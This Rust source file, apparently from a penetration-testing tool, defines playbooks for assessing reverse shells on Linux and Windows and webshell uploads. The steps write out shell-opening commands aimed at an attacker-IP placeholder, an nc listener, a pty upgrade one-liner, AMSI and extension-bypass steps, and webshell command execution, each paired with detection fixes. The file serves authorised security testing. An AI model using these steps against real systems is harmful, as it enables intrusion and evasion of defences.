//! Remote Access Playbooks
//!
//! Playbooks for establishing remote access: reverse shells, webshells.

use crate::playbooks::types::*;
use crate::scripts::FindingSeverity;

/// Reverse Shell Assessment - Linux
///
/// Simulates establishing a reverse shell on a Linux target.
/// Used to test: egress filtering, endpoint detection, shell execution monitoring.
pub fn reverse_shell_linux() -> Playbook {
    Playbook::new("reverse-shell-linux", "Reverse Shell Assessment (Linux)")
        .with_description("Assess ability to establish and maintain reverse shell access on Linux systems")
        .with_objective("Validate network egress controls and endpoint detection capabilities by attempting to establish outbound shell connections")
        .for_target(TargetType::Host)
        .for_os(TargetOS::Linux)
        .with_risk(RiskLevel::High)
        .with_duration("10-30 minutes")
        // Internal MITRE mapping (never shown to users)
        .with_mitre("T1059.004") // Command and Scripting Interpreter: Unix Shell
        .with_mitre("T1071.001") // Application Layer Protocol: Web Protocols
        .with_mitre("T1573.001") // Encrypted Channel: Symmetric Cryptography
        // Pre-conditions
        .add_precondition(
            PreCondition::new("Target system is reachable")
                .with_check("network-ping")
        )
        .add_precondition(
            PreCondition::new("Attack machine has listener capability")
                .with_notes("Ensure you have a machine to receive connections")
        )
        .add_precondition(
            PreCondition::new("Authorization for testing confirmed")
        )
        // Attack Flow - Step 1: Network Reconnaissance
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Recon, "Egress Port Check")
                .with_description("Verify which outbound ports are allowed through the firewall")
                .with_command("rb network ports scan {{ attacker_ip }} 80 443 8080 4444 --from-target")
                .with_success("Identified open egress ports")
                .with_failure("All egress ports blocked - try DNS/ICMP tunneling")
                .collects(EvidenceType::NetworkMap)
                .with_mitre("T1046", None), // Network Service Scanning
        )
        // Step 2: Shell Payload Generation
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::Execution, "Generate Payload")
                .with_description("Create reverse shell payload for identified egress path")
                .with_command("rb exploit payload shell bash {{ attacker_ip }} {{ port }}")
                .with_success("Payload generated successfully")
                .depends(1)
                .collects(EvidenceType::FileArtifact)
                .with_mitre("T1059.004", Some("Generate Unix shell payload")),
        )
        // Step 3: Start Listener
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::Execution, "Start Listener")
                .with_description("Start listener on attack machine to receive connection")
                .with_manual("Run: nc -lvnp {{ port }} on attack machine")
                .with_success("Listener active on port {{ port }}")
                .with_failure("Port binding failed - check if port is in use")
                .parallel(2) // Can run in parallel with step 2
                .collects(EvidenceType::SessionData)
                .with_mitre("T1571", None), // Non-Standard Port
        )
        // Step 4: Deliver Payload
        .add_step(
            PlaybookStep::new(4, PlaybookPhase::Execution, "Deliver Payload")
                .with_description("Execute the reverse shell payload on target")
                .with_command("Execute payload via existing access or vulnerability")
                .with_success("Payload executed on target")
                .with_failure("Payload blocked by AV/EDR - try obfuscation")
                .depends(2)
                .collects(EvidenceType::CommandOutput)
                .with_mitre("T1059.004", Some("Execute shell payload")),
        )
        // Step 5: Verify Connection
        .add_step(
            PlaybookStep::new(5, PlaybookPhase::Execution, "Verify Shell Access")
                .with_description("Confirm reverse shell connection is established")
                .with_manual("Check listener window for incoming connection")
                .with_success("Shell connection established - run 'id' to verify")
                .with_failure("No connection - check firewall/network path")
                .depends(3)
                .depends(4)
                .collects(EvidenceType::SessionData)
                .with_mitre("T1071.001", Some("Verify C2 channel")),
        )
        // Step 6: Maintain Access
        .add_step(
            PlaybookStep::new(6, PlaybookPhase::Persistence, "Stabilize Shell")
                .with_description("Upgrade to fully interactive shell")
                .with_manual("python3 -c 'import pty;pty.spawn(\"/bin/bash\")' && export TERM=xterm")
                .with_success("Interactive shell established")
                .optional()
                .when(StepCondition::OnSuccess(5))
                .collects(EvidenceType::SessionData)
                .with_mitre("T1059.004", Some("Stabilize shell")),
        )
        // Expected Evidence
        .add_evidence(
            ExpectedEvidence::new("Reverse shell connection")
                .at("Attacker machine listener")
                .with_indicator("Connection from target IP, command prompt available")
                .severity(FindingSeverity::Critical),
        )
        .add_evidence(
            ExpectedEvidence::new("Command execution proof")
                .at("Shell session")
                .with_indicator("Output of 'id', 'whoami', 'hostname' commands")
                .severity(FindingSeverity::Critical),
        )
        // Failed Controls
        .add_failed_control(
            FailedControl::new(
                "Egress Filtering",
                "Outbound connection to non-standard port was allowed",
            )
            .with_fix("Implement strict egress filtering - allow only necessary ports"),
        )
        .add_failed_control(
            FailedControl::new(
                "Endpoint Detection",
                "Reverse shell execution was not detected by EDR",
            )
            .with_fix("Deploy EDR with behavioral analysis for shell spawning"),
        )
        // Variations
        .add_variation(PlaybookVariation {
            name: "Encrypted Channel".into(),
            description: "Use encrypted reverse shell".into(),
            command: Some("rb exploit payload shell bash-ssl {{ ip }} {{ port }}".into()),
            ..Default::default()
        })
        .add_variation(PlaybookVariation {
            name: "HTTP Tunnel".into(),
            description: "Tunnel shell over HTTP/HTTPS".into(),
            command: Some("rb exploit payload shell http {{ ip }} {{ port }}".into()),
            ..Default::default()
        })
        // Kill Chain Position
        .with_kill_chain(KillChainPhase::Exploitation())
        .with_kill_chain(KillChainPhase::CommandAndControl())
}

/// Reverse Shell Assessment - Windows
///
/// Simulates establishing a reverse shell on a Windows target.
pub fn reverse_shell_windows() -> Playbook {
    Playbook::new(
        "reverse-shell-windows",
        "Reverse Shell Assessment (Windows)",
    )
    .with_description(
        "Assess ability to establish and maintain reverse shell access on Windows systems",
    )
    .with_objective(
        "Validate Windows Defender, AMSI, and network controls against reverse shell attempts",
    )
    .for_target(TargetType::Host)
    .for_os(TargetOS::Windows)
    .with_risk(RiskLevel::High)
    .with_duration("15-45 minutes")
    .with_mitre("T1059.001") // PowerShell
    .with_mitre("T1071.001")
    .add_precondition(PreCondition::new("Target Windows system is reachable"))
    .add_precondition(PreCondition::new(
        "Attack machine ready for incoming connections",
    ))
    .add_step(
        PlaybookStep::new(1, PlaybookPhase::Recon, "Egress Analysis")
            .with_description("Identify allowed egress paths")
            .with_command("rb network ports scan {{ attacker_ip }} --from-target")
            .with_success("Egress path identified")
            .collects(EvidenceType::NetworkMap)
            .with_mitre("T1046", None),
    )
    .add_step(
        PlaybookStep::new(2, PlaybookPhase::Execution, "Generate PowerShell Payload")
            .with_description("Create encoded PowerShell reverse shell")
            .with_command("rb exploit payload shell powershell {{ attacker_ip }} {{ port }}")
            .with_success("Encoded payload ready")
            .depends(1)
            .collects(EvidenceType::FileArtifact)
            .with_mitre("T1059.001", Some("Generate PowerShell payload")),
    )
    .add_step(
        PlaybookStep::new(3, PlaybookPhase::Execution, "AMSI Bypass (if needed)")
            .with_description("Bypass AMSI if payload is blocked")
            .with_manual("Use AMSI bypass technique before payload execution")
            .with_success("AMSI bypassed")
            .optional()
            .collects(EvidenceType::CommandOutput)
            .with_mitre("T1562.001", Some("Disable or Modify Tools")),
    )
    .add_step(
        PlaybookStep::new(4, PlaybookPhase::Execution, "Execute Payload")
            .with_description("Run reverse shell payload on target")
            .with_manual("Execute via cmd.exe, PowerShell, or exploit")
            .with_success("Payload executed")
            .depends(2)
            .collects(EvidenceType::CommandOutput)
            .with_mitre("T1059.001", None),
    )
    .add_step(
        PlaybookStep::new(5, PlaybookPhase::Execution, "Verify Connection")
            .with_description("Confirm shell connection established")
            .with_manual("Check for incoming connection on listener")
            .with_success("Shell active - run 'whoami' to verify")
            .depends(4)
            .collects(EvidenceType::SessionData)
            .with_mitre("T1071.001", None),
    )
    .add_evidence(
        ExpectedEvidence::new("Windows reverse shell")
            .at("Attacker listener")
            .with_indicator("cmd.exe or PowerShell prompt from target")
            .severity(FindingSeverity::Critical),
    )
    .add_failed_control(
        FailedControl::new("AMSI Protection", "AMSI bypass successful")
            .with_fix("Keep AMSI updated, use additional endpoint protection"),
    )
    .add_failed_control(
        FailedControl::new("PowerShell Logging", "Malicious PowerShell not logged")
            .with_fix("Enable PowerShell Script Block Logging and Module Logging"),
    )
    .with_kill_chain(KillChainPhase::Exploitation())
    .with_kill_chain(KillChainPhase::CommandAndControl())
}

/// Web Shell Upload Assessment
///
/// Tests ability to upload and execute a webshell through file upload functionality.
pub fn webshell_upload() -> Playbook {
    Playbook::new("webshell-upload", "Web Shell Upload Assessment")
        .with_description("Assess file upload security controls by attempting webshell deployment")
        .with_objective("Validate file upload restrictions and web application firewall rules against webshell attacks")
        .for_target(TargetType::WebApp)
        .for_os(TargetOS::Any)
        .with_risk(RiskLevel::High)
        .with_duration("20-45 minutes")
        .with_mitre("T1505.003") // Server Software Component: Web Shell
        .add_precondition(PreCondition::new("File upload functionality identified"))
        .add_precondition(PreCondition::new("Target web technology known (PHP, ASP, JSP)"))
        .add_step(
            PlaybookStep::new(1, PlaybookPhase::Recon, "Upload Analysis")
                .with_description("Analyze file upload restrictions")
                .with_manual("Test file extension and content-type restrictions")
                .with_success("Upload restrictions understood")
                .collects(EvidenceType::SystemInfo)
                .with_mitre("T1595.002", None),
        )
        .add_step(
            PlaybookStep::new(2, PlaybookPhase::Execution, "Prepare Webshell")
                .with_description("Create webshell matching target technology")
                .with_command("rb exploit payload webshell {{ tech }}")
                .with_success("Webshell payload ready")
                .depends(1)
                .collects(EvidenceType::FileArtifact)
                .with_mitre("T1505.003", Some("Prepare webshell")),
        )
        .add_step(
            PlaybookStep::new(3, PlaybookPhase::Execution, "Upload Webshell")
                .with_description("Upload webshell using identified bypass technique")
                .with_manual("Upload with extension bypass: .phtml, .php5, .phar")
                .with_success("Webshell uploaded")
                .depends(2)
                .collects(EvidenceType::FileArtifact)
                .with_mitre("T1505.003", None),
        )
        .add_step(
            PlaybookStep::new(4, PlaybookPhase::Execution, "Locate Webshell")
                .with_description("Find uploaded webshell location")
                .with_command("rb web fuzz {{ target }}/uploads --wordlist shell-names")
                .with_success("Webshell path identified")
                .depends(3)
                .collects(EvidenceType::SystemInfo)
                .with_mitre("T1083", None), // File and Directory Discovery
        )
        .add_step(
            PlaybookStep::new(5, PlaybookPhase::Execution, "Execute Commands")
                .with_description("Verify webshell execution")
                .with_command("rb web asset get {{ shell_url }}?cmd=id")
                .with_success("Command execution confirmed")
                .depends(4)
                .collects(EvidenceType::CommandOutput)
                .with_mitre("T1059", None), // Command and Scripting Interpreter
        )
        .add_evidence(
            ExpectedEvidence::new("Webshell access")
                .at("Web application")
                .with_indicator("Command output visible in browser/response")
                .severity(FindingSeverity::Critical),
        )
        .add_failed_control(
            FailedControl::new("File Upload Validation", "Webshell uploaded despite restrictions")
                .with_fix("Implement strict whitelist for file types, validate content not just extension"),
        )
        .add_failed_control(
            FailedControl::new("WAF Detection", "WAF did not block webshell upload/execution")
                .with_fix("Deploy WAF with webshell detection signatures"),
        )
        .with_kill_chain(KillChainPhase::Exploitation())
        .with_kill_chain(KillChainPhase::Installation())
}
